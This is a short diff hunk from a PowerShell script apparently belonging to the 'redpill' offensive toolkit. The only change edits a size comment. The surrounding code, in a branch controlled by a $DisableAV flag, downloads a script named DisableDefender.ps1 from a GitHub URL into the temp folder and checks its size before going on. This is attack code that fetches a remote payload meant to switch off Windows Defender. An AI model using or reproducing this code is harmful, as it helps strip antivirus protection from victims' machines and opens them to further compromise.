@@ -2143,7 +2143,7 @@ If($DisableAV -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,265625/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,6923828125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
